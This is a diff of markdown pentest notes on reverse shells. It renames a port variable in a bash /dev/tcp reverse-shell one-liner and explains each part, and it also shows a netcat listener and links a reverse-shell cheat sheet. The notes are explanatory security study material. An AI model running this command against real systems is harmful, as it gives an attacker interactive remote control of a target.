@@ -32,13 +32,13 @@ nc -lvnp 1234
 
 #### Linux Reverse Shells
 ```bash
-bash -c 'bash -i >& /dev/tcp/$ip$/$port 0>&1'
+bash -c 'bash -i >& /dev/tcp/$ip$/$listen 0>&1'
 ```
 - `bash -c '...'` run commands inside the quotes
 - `bash -i` start interactive shell 
 - `>&` takes the output and errors, bundles them together to whatever comes next, `>` for redirecting, and `&` for bundling
-- `/dev/tcp/10.10.10.10/1234` destination for the redirection, treated as a network connection to the IP on the port `$port`
-- `0>&1` redirect inputs to where output is going, our network `10.10.10.10:1234`
+- `/dev/tcp/$ip/$listen` destination for the redirection, treated as a network connection to the IP on the port `$listen`
+- `0>&1` redirect inputs to where output is going, our network `$ip:$port$`
 ## Things to know
 - Command executed depend on the OS of the target
 - [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet
